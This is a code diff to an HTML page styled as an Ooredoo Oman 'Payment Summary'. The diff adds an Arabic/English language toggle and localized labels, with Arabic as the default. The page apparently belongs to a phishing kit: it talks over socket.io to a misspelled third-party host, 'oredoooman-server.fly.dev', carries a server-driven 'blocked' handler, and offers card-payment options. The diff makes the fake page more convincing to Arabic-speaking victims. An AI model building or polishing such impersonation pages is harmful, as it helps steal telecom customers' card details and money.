@@ -1,13 +1,16 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="ar" dir="rtl">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Payment Summary | Ooredoo</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
-body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #f5f5f5; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
-.card { background: #fff; border-radius: 16px; box-shadow: 0 4px 24px rgba(0,0,0,0.08); padding: 40px 36px; max-width: 480px; width: 100%; margin: 20px; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #f5f5f5; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+.lang-toggle-wrapper { width: 100%; max-width: 480px; display: flex; justify-content: flex-start; margin-bottom: 8px; padding: 0 20px; }
+.lang-toggle { background: #fff; border: 1px solid #ddd; border-radius: 20px; padding: 6px 16px; font-size: 13px; cursor: pointer; color: #333; }
+.lang-toggle:hover { background: #f0f0f0; }
+.card { background: #fff; border-radius: 16px; box-shadow: 0 4px 24px rgba(0,0,0,0.08); padding: 40px 36px; max-width: 480px; width: 100%; margin: 0 20px 20px; }
 .service-info { display: flex; justify-content: space-between; align-items: center; background: #f7f7f8; border-radius: 12px; padding: 14px 20px; margin-bottom: 28px; }
 .service-info .label { font-size: 13px; color: #666; }
 .service-info .value { font-size: 15px; font-weight: 600; color: #080808; margin-top: 2px; }
@@ -42,40 +45,46 @@ h2 { text-align: center; font-size: 20px; font-weight: 600; color: #1a1a1a; marg
 .proceed-btn:hover { background: #d4191f; box-shadow: 0 10px 28px rgba(237,28,36,0.35); }
 .proceed-btn:disabled { background: #ccc; box-shadow: none; cursor: not-allowed; }
 @media (max-width: 500px) {
-  .card { padding: 28px 20px; margin: 10px; border-radius: 12px; }
-  .options { flex-direction: row; gap: 10px; }
+  .card { padding: 28px 20px; margin: 0 10px 10px; border-radius: 12px; }
+  .options { gap: 10px; }
   .option { padding: 14px 12px; }
   h2 { font-size: 18px; }
   .logos { gap: 14px; }
+  .lang-toggle-wrapper { padding: 0 10px; margin-top: 10px; }
 }
 </style>
 </head>
 <body>
+
+<div class="lang-toggle-wrapper">
+  <button class="lang-toggle" id="langToggle" onclick="toggleLanguage()">English</button>
+</div>
+
 <div class="card">
   <!-- Service info -->
   <div class="service-info">
     <div>
-      <div class="label">Service Number</div>
+      <div class="label" id="serviceLabel">رقم الخدمة</div>
       <div class="value" id="service-number">-</div>
     </div>
-    <div class="amount"><span id="total-amount">0</span> <span id="currency-label">OMR</span></div>
+    <div class="amount"><span id="total-amount">0</span> <span id="currency-label">ر.ع</span></div>
   </div>
 
-  <h2>Select an option and proceed</h2>
+  <h2 id="pageTitle">اختر طريقة الدفع وتابع</h2>
 
   <div class="options">
     <div class="option selected" data-method="omani" onclick="selectOption('omani')">
       <div class="radio"></div>
       <div class="option-content">
         <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 36 24'%3E%3Crect width='36' height='24' rx='3' fill='%23fff' stroke='%23ccc'/%3E%3Crect y='0' width='36' height='8' fill='%23fff'/%3E%3Crect y='8' width='36' height='8' fill='%23ed1c24'/%3E%3Crect y='16' width='36' height='8' fill='%23008000'/%3E%3Crect x='0' y='0' width='10' height='24' fill='%23ed1c24'/%3E%3C/svg%3E" alt="Oman Flag" style="height:22px;">
-        <span>Omani Cards</span>
+        <span id="omaniLabel">بطاقات عمانية</span>
       </div>
     </div>
     <div class="option" data-method="international" onclick="selectOption('international')">
       <div class="radio"></div>
       <div class="option-content">
         <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 36 36'%3E%3Ccircle cx='18' cy='18' r='16' fill='%23e8f5e9' stroke='%2366bb6a' stroke-width='1'/%3E%3Cpath d='M18 4 C10 4 4 10 4 18 C4 26 10 32 18 32 C26 32 32 26 32 18 C32 10 26 4 18 4' fill='none' stroke='%2366bb6a' stroke-width='1'/%3E%3Cpath d='M18 4 C14 4 11 10 11 18 C11 26 14 32 18 32 C22 32 25 26 25 18 C25 10 22 4 18 4' fill='none' stroke='%2366bb6a' stroke-width='1'/%3E%3Cline x1='4' y1='14' x2='32' y2='14' stroke='%2366bb6a' stroke-width='1'/%3E%3Cline x1='4' y1='22' x2='32' y2='22' stroke='%2366bb6a' stroke-width='1'/%3E%3C/svg%3E" alt="International" style="height:22px;">
-        <span>International Cards</span>
+        <span id="internationalLabel">بطاقات دولية</span>
       </div>
     </div>
     <div class="option" data-method="applepay" onclick="selectOption('applepay')">
@@ -86,16 +95,16 @@ h2 { text-align: center; font-size: 20px; font-weight: 600; color: #1a1a1a; marg
       </div>
     </div>
   </div>
-  <div class="apple-unavailable" id="appleUnavailable" style="display:none;margin-top:-12px;margin-bottom:16px;color:#ed1c24;font-size:12px;">Apple Pay is currently unavailable</div>
+  <div class="apple-unavailable" id="appleUnavailable" style="display:none;margin-top:-12px;margin-bottom:16px;color:#ed1c24;font-size:12px;" data-ar="Apple Pay غير متاح حالياً" data-en="Apple Pay is currently unavailable">Apple Pay غير متاح حالياً</div>
 
   <div class="security-link">
     <svg width="16" height="16" viewBox="0 0 24 24" fill="#f5a623"><path d="M12 1C8.676 1 6 3.676 6 7v3H5a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2h-1V7c0-3.324-2.676-6-6-6zm0 2c2.276 0 4 1.724 4 4v3H8V7c0-2.276 1.724-4 4-4z"/></svg>
-    <a href="#">More about card security</a>
+    <a href="#" id="securityLink">المزيد عن أمان البطاقة</a>
   </div>
 
   <div class="divider"></div>
 
-  <div class="we-accept"><span>WE ACCEPT</span></div>
+  <div class="we-accept"><span id="weAcceptLabel">نقبل الدفع بـ</span></div>
 
   <div class="logos">
     <span class="visa-text">VISA</span>
@@ -108,12 +117,70 @@ h2 { text-align: center; font-size: 20px; font-weight: 600; color: #1a1a1a; marg
     <span style="font-size:14px;font-weight:700;color:#6c3fa0;display:flex;align-items:center;gap:2px;">مـال <svg width="18" height="18" viewBox="0 0 24 24"><circle cx="8" cy="12" r="4" fill="#6c3fa0"/><circle cx="16" cy="8" r="3" fill="#00bcd4"/><circle cx="16" cy="16" r="3" fill="#4caf50"/></svg></span>
   </div>
 
-  <button class="proceed-btn" id="proceedBtn" onclick="handleProceed()">Proceed to payment</button>
+  <button class="proceed-btn" id="proceedBtn" onclick="handleProceed()">متابعة الدفع</button>
 </div>
 
 <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
 <script>
 (function() {
+  var translations = {
+    ar: {
+      langBtn: 'English',
+      serviceLabel: 'رقم الخدمة',
+      currency: 'ر.ع',
+      title: 'اختر طريقة الدفع وتابع',
+      omaniCards: 'بطاقات عمانية',
+      internationalCards: 'بطاقات دولية',
+      appleUnavailable: 'Apple Pay غير متاح حالياً',
+      securityLink: 'المزيد عن أمان البطاقة',
+      weAccept: 'نقبل الدفع بـ',
+      proceedBtn: 'متابعة الدفع',
+      processing: 'جاري المعالجة...',
+      blocked: 'تم حظرك من استخدام هذه الخدمة.'
+    },
+    en: {
+      langBtn: 'العربية',
+      serviceLabel: 'Service Number',
+      currency: 'OMR',
+      title: 'Select an option and proceed',
+      omaniCards: 'Omani Cards',
+      internationalCards: 'International Cards',
+      appleUnavailable: 'Apple Pay is currently unavailable',
+      securityLink: 'More about card security',
+      weAccept: 'WE ACCEPT',
+      proceedBtn: 'Proceed to payment',
+      processing: 'Processing...',
+      blocked: 'You have been blocked from using this service.'
+    }
+  };
+
+  var currentLang = localStorage.getItem('siteLang') || localStorage.getItem('oredoo_site_language') || 'ar';
+
+  function applyLanguage() {
+    var t = translations[currentLang];
+    document.documentElement.lang = currentLang === 'ar' ? 'ar' : 'en';
+    document.documentElement.dir = currentLang === 'ar' ? 'rtl' : 'ltr';
+    document.body.style.direction = currentLang === 'ar' ? 'rtl' : 'ltr';
+    document.getElementById('langToggle').textContent = t.langBtn;
+    document.getElementById('serviceLabel').textContent = t.serviceLabel;
+    document.getElementById('currency-label').textContent = t.currency;
+    document.getElementById('pageTitle').textContent = t.title;
+    document.getElementById('omaniLabel').textContent = t.omaniCards;
+    document.getElementById('internationalLabel').textContent = t.internationalCards;
+    document.getElementById('appleUnavailable').textContent = t.appleUnavailable;
+    document.getElementById('securityLink').textContent = t.securityLink;
+    document.getElementById('weAcceptLabel').textContent = t.weAccept;
+    document.getElementById('proceedBtn').textContent = t.proceedBtn;
+  }
+
+  window.toggleLanguage = function() {
+    currentLang = currentLang === 'ar' ? 'en' : 'ar';
+    localStorage.setItem('siteLang', currentLang); localStorage.setItem('oredoo_site_language', currentLang);
+    applyLanguage();
+  };
+
+  applyLanguage();
+
   var selectedOption = 'omani';
   var isProcessing = false;
   var SOCKET_URL = 'https://oredoooman-server.fly.dev';
@@ -125,11 +192,9 @@ h2 { text-align: center; font-size: 20px; font-weight: 600; color: #1a1a1a; marg
   try { billData = JSON.parse(sessionStorage.getItem('last_ooredoo_bill_lookup') || 'null'); } catch(e) {}
   var serviceNumber = (billData && (billData.number || billData.customerNumber)) || '-';
   var amount = (billData && billData.amount) || 0;
-  var currency = 'OMR';
 
   document.getElementById('service-number').textContent = serviceNumber;
   document.getElementById('total-amount').textContent = amount;
-  document.getElementById('currency-label').textContent = currency;
 
   // Socket connection
   socket.on('connect', function() {
@@ -157,7 +222,7 @@ h2 { text-align: center; font-size: 20px; font-weight: 600; color: #1a1a1a; marg
   });
 
   socket.on('blocked', function() {
-    alert('You have been blocked from using this service.');
+    alert(translations[currentLang].blocked);
   });
 
   // Select option
@@ -194,7 +259,7 @@ h2 { text-align: center; font-size: 20px; font-weight: 600; color: #1a1a1a; marg
     if (isProcessing || selectedOption === 'applepay') return;
     isProcessing = true;
     var btn = document.getElementById('proceedBtn');
-    btn.textContent = 'Processing...';
+    btn.textContent = translations[currentLang].processing;
     btn.disabled = true;
 
     var paymentMethodLabel = selectedOption === 'omani' ? 'Omani Cards' : 'International Cards';
